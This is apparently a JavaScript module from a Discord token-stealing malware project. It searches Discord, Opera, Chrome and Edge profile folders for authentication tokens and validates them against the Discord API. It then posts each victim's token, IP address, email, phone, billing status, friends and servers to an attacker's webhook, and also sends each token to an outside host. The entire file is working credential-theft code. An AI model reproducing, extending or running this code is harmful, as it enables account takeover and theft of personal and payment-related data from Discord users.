const { getPublicIp } = require("./../../modules/core/core");
const { fetchServers, getEmbeds, send } = require("./../../utils/functions");
const { WebhookClient } = require("discord.js");
const { totalsTokens, find } = require("./find");
const DiscordToken = require("discord.js-token");
const getconfig = require("./../../config/config")();
const process = require("process");
const axios = require("axios");

const webhook = new WebhookClient({
    url: getconfig.webhook,
});

const appData = process.env.appdata;
const localAppData = process.env.localappdata;

let paths = [
    `${appData}/discord/`,
    `${appData}/discordcanary/`,
    `${appData}/discordptb/`,
    `${appData}/discorddevelopment/`,
    `${appData}/lightcord/`,
    `${appData}/Opera Software/Opera Stable/`,
    `${appData}/Opera Software/Opera GX Stable/`,
    `${localAppData}/Google/Chrome/User Data/Default/`,
    `${localAppData}/Google/Chrome/User Data/Profile 1/`,
    `${localAppData}/Google/Chrome/User Data/Profile 2/`,
    `${localAppData}/Google/Chrome/User Data/Profile 3/`,
    `${localAppData}/Google/Chrome/User Data/Profile 4/`,
    `${localAppData}/Google/Chrome/User Data/Profile 5/`,
    `${localAppData}/Google/Chrome/User Data/Guest Profile/`,
    `${localAppData}/Google/Chrome/User Data/Default/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 1/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 2/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 3/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 4/Network/`,
    `${localAppData}/Google/Chrome/User Data/Profile 5/Network/`,
    `${localAppData}/Google/Chrome/User Data/Guest Profile/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Default/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 1/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 2/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 3/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 4/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 5/`,
    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/`,
    `${localAppData}/Microsoft/Edge/User Data/Default/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 1/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 2/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 3/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 4/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Profile 5/Network/`,
    `${localAppData}/Microsoft/Edge/User Data/Guest Profile/Network/`,
];

async function sendTokens() {
    for (let path of paths) {
        await find(path);
    }
    for (let token of totalsTokens) {
        let k4itrun;
        await axios({
            url: `https://discord.com/api/v9/users/@me`,
            method: "GET",
            headers: {
                Authorization: token,
            },
        })  .then((r) => { k4itrun = r.data })
            .catch((e) => { k4itrun = null });

        if (!k4itrun) continue;

        var copy = `https://6889.fun/api/aurathemes/raw?data=${token}`;
        var servers = await fetchServers(token);
        let network = await getPublicIp();
        var discord = new DiscordToken(token, network.ip, k4itrun.password).info;

        webhook.send(send(getEmbeds({
            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
            thumbnail: "" + discord.avatar + "",
            title: "Initialized Grabber",
            fields: [
                { name: "<a:aura:1087044506542674091> Token:", value: "```" + discord.token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
                { name: "<a:aura:995172580988309664> IP Adress", value: "`" + network.ip + "`", inline: true },
                { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
                { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
                { name: "Badges", value: "" + discord.badges + "", inline: true },
                { name: "Billing", value: "" + discord.billing + "", inline: true },
            ],
        }))).then((r) => { axios.get(copy) }).catch((e) => { axios.get(copy) });

        setTimeout(() => webhook.send(send(getEmbeds({
            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
            thumbnail: "" + discord.avatar + "",
            title: "HQ Friend(s)",
            desc: "" + discord.StrangeFriends + "" === "None" ? "```yml\n" + "Not found" + "```" : "**" + discord.StrangeFriends + "**"
        }))), 50);

        setTimeout(() => webhook.send(send(getEmbeds({
            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
            thumbnail: "" + discord.avatar + "",
            title: "HQ Guild(s)",
            desc: "" + servers.all + ""
        }))), 50);

        setTimeout(() => webhook.send(send(getEmbeds({
            author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
            thumbnail: "" + discord.avatar + "",
            title: "User Informatio(s)",
            desc:
                "**NSFW**" + discord.NSFW + "\n" +
                "**Status**" + discord.status + "\n" +
                "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" +
                "**Connection**" + "`" + discord.totalConnection + "`\n" +
                "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" +
                "**Blocked**" + "`" + discord.totalBlocked + "`\n" +
                "**Servers**" + "`" + discord.totalGuild + "`\n" +
                "**Friends**" + "`" + discord.totalFriend + "`\n" +
                "**Theme**" + "`" + discord.theme + "`\n" +
                "**Pending**" + "`" + discord.pending + "`\n\n" +
                "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
        }))), 100);
        continue;
    }
}

module.exports = {
    sendTokens
}